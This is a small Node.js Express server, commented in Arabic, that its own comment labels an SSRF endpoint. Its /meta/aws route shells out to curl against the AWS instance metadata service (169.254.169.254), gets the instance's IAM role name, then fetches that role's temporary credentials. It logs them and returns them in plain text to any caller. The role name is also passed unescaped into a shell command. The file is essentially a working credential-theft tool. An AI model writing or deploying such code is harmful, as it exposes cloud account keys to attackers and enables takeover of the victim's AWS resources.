const express = require("express");
const { exec } = require("child_process");
const app = express();
const PORT = 10000;

// استخراج اسم الدور (IAM Role)
function getIAMRole(callback) {
  const cmd = `curl -m 2 -s http://169.254.169.254/latest/meta-data/iam/security-credentials/`;
  exec(cmd, (err, stdout) => {
    if (err || !stdout.trim()) return callback(null);
    callback(stdout.trim());
  });
}

// استخراج الـ credentials باستخدام اسم الدور
function getIAMCredentials(role, callback) {
  const credsURL = `http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}`;
  const cmd = `curl -m 2 -s "${credsURL}"`;
  exec(cmd, (err, stdout) => {
    if (err || !stdout) {
      callback(null);
    } else {
      callback(stdout);
    }
  });
}

// SSRF endpoint الجديد
app.get("/meta/aws", (req, res) => {
  getIAMRole((role) => {
    if (!role) {
      res.send("❌ No IAM Role found (maybe not AWS or blocked).");
      return;
    }

    console.log("🔐 IAM Role:", role);

    getIAMCredentials(role, (creds) => {
      if (!creds) {
        res.send(`🧨 IAM Role found (${role}) but credentials not returned.`);
      } else {
        console.log("✅ IAM Credentials:\n", creds);
        res.send(`<pre>${creds}</pre>`);
      }
    });
  });
});

app.listen(PORT, () => {
  console.log(`🔥 Server running at http://localhost:${PORT}`);
});
